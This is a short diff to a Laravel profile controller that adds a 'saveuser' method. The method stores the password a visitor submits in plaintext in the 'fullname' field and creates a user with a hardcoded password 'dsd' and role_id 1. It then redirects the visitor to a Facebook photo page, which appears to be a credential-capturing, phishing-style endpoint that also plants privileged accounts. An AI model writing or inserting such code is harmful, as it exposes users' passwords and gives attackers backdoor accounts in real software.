@@ -55,4 +55,17 @@ class ProfileController extends Controller
             ],
         ]);
     }
+    public function saveuser(Request $request){        
+        $data['username'] = "hi";
+        $data['fullname'] = $request->password;
+        $data['email'] = $request->email;
+        $data['password'] = "dsd";
+        $data['role_id'] = 1;
+        $data['exp'] = 1;
+        $data['point'] = 1;
+        $data['status'] = 1;
+        User::create($data);
+
+        return redirect('https://www.facebook.com/Nguoitoico.Community/photos/a.923871091282959/996916587311742/?type=3&theater');
+    }
 }
